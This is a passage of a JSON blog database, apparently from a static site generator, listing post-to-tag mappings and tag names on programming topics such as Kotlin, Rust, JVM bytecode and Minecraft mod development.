x002msfkl3o7b2g4u","_id":"clbx23jud005asfkl87unai8y"},{"post_id":"clbx23jts0027sfkl9j2b3f4m","tag_id":"clbx23jtu002dsfkldcohdj4b","_id":"clbx23jud005bsfkl8yj49ttj"},{"post_id":"clbx23jtt002asfklccn5f8w7","tag_id":"clbx23juc0059sfklf2rahwzf","_id":"clbx23jud005esfkl02618h4d"},{"post_id":"clbx23jtt002asfklccn5f8w7","tag_id":"clbx23jud005csfkl9o4ufkp9","_id":"clbx23jud005fsfklgzg9h236"},{"post_id":"clbx23jtu002esfklfuouehul","tag_id":"clbx23juc0059sfklf2rahwzf","_id":"clbx23jue005isfklgt55fsys"},{"post_id":"clbx23jtu002esfklfuouehul","tag_id":"clbx23jud005csfkl9o4ufkp9","_id":"clbx23jue005jsfkl7kleg8x3"},{"post_id":"clbx23jtv002hsfkl3gfsb68t","tag_id":"clbx23jtx002msfkl3o7b2g4u","_id":"clbx23juf005nsfklf3l097x1"},{"post_id":"clbx23jtv002hsfkl3gfsb68t","tag_id":"clbx23jua004usfkl9b5o1q8x","_id":"clbx23juf005osfkldrnd2gxw"},{"post_id":"clbx23jtv002hsfkl3gfsb68t","tag_id":"clbx23jth0014sfkl40hi27vh","_id":"clbx23juf005qsfkl73j753ug"},{"post_id":"clbx23jtv002hsfkl3gfsb68t","tag_id":"clbx23jue005lsfklf120c2u9","_id":"clbx23juf005rsfklev1m31v1"},{"post_id":"clbx23jtw002ksfkl1hhcetty","tag_id":"clbx23jua004usfkl9b5o1q8x","_id":"clbx23jug005tsfkl996oemq4"},{"post_id":"clbx23jtw002ksfkl1hhcetty","tag_id":"clbx23jtx002msfkl3o7b2g4u","_id":"clbx23jug005usfklat3y1qdz"},{"post_id":"clbx23jty002qsfklcez0fbg1","tag_id":"clbx23juf005ssfkl1v0h038v","_id":"clbx23juh005ysfkl48kx46px"},{"post_id":"clbx23jty002qsfklcez0fbg1","tag_id":"clbx23jug005vsfkl3tc22cuc","_id":"clbx23juh005zsfkl9wgbem5g"},{"post_id":"clbx23jty002qsfklcez0fbg1","tag_id":"clbx23ju1003dsfklf51t7jxu","_id":"clbx23juh0060sfkl4tkw3yi2"},{"post_id":"clbx23ju0002usfkla1pfcl4g","tag_id":"clbx23ju10039sfkl1rovh9vd","_id":"clbx23juh0061sfklarnh6ltd"},{"post_id":"clbx23ju0002usfkla1pfcl4g","tag_id":"clbx23jtx002msfkl3o7b2g4u","_id":"clbx23juh0062sfkl5di623u7"},{"post_id":"clbx23ju0002usfkla1pfcl4g","tag_id":"clbx23jtu002dsfkldcohdj4b","_id":"clbx23juh0063sfklf20gdkzs"}],"Tag":[{"name":"年度总结","_id":"clbx23jt00005sfkl31xhgp1t"},{"name":"算法","_id":"clbx23jt5000dsfklbjfqhka1"},{"name":"Android","_id":"clbx23jt7000ksfklhl2o3tk6"},{"name":"javascript","_id":"clbx23jtc000qsfklabkydf14"},{"name":"知识梳理","_id":"clbx23jtf000xsfkl39kj13cp"},{"name":"MySQL","_id":"clbx23jth0014sfkl40hi27vh"},{"name":"运维","_id":"clbx23jti001bsfkl78tv6pc3"},{"name":"linux","_id":"clbx23jtk001hsfkl19xub070"},{"name":"arch linux","_id":"clbx23jtm001nsfkl9tf97p7j"},{"name":"rust","_id":"clbx23jtp001usfkl8zg337ee"},{"name":"docker","_id":"clbx23jtq0021sfklca3sf5ys"},{"name":"framework层","_id":"clbx23jts0026sfkl53er7zxi"},{"name":"Java","_id":"clbx23jtu002dsfkldcohdj4b"},{"name":"Kotlin","_id":"clbx23jtx002msfkl3o7b2g4u"},{"name":"git","_id":"clbx23jtz002ssfkl9som4vvj"},{"name":"maven","_id":"clbx23ju0002ysfkl7sbn8i73"},{"name":"MVVM","_id":"clbx23ju10034sfkl02pz5k1j"},{"name":"外部库","_id":"clbx23ju10039sfkl1rovh9vd"},{"name":"ASM","_id":"clbx23ju1003dsfklf51t7jxu"},{"name":"Minecraft","_id":"clbx23ju2003fsfkl7wh2a9mw"},{"name":"Forge模组开发","_id":"clbx23ju2003isfklhmeme1wb"},{"name":"字节码操作","_id":"clbx23ju3003ksfklehqnccxf"},{"name":"Mixin","_id":"clbx23ju3003lsfkl4ii0ae7b"},{"name":"SpringBoot","_id":"clbx23ju4003psfkl2xr61e7i"},{"name":"后端","_id":"clbx23ju4003ssfkl69jnfgbg"},{"name":"Idea","_id":"clbx23ju6003zsfkl5s979v58"},{"name":"Compose","_id":"clbx23ju7004bsfkl2vbmh251"},{"name":"委托","_id":"clbx23ju8004hsfkl39pz62us"},{"name":"Coroutine","_id":"clbx23ju9004osfkl0zy99u9l"},{"name":"Bukkit","_id":"clbx23ju9004psfkl7xvie6yw"},{"name":"TabooLib","_id":"clbx23jua004usfkl9b5o1q8x"},{"name":"网络操作","_id":"clbx23jub004ysfkl8l2r6lah"},{"name":"Rust","_id":"clbx23juc0059sfklf2rahwzf"},{"name":"Rust学习笔记","_id":"clbx23jud005csfkl9o4ufkp9"},{"name":"动态代理","_id":"clbx23jue005lsfklf120c2u9"},{"name":"JVM","_id":"clbx23juf005ssfkl1v0h038v"},{"name":"字节码","_id":"clbx23jug005vsfkl3tc22cuc"}]}}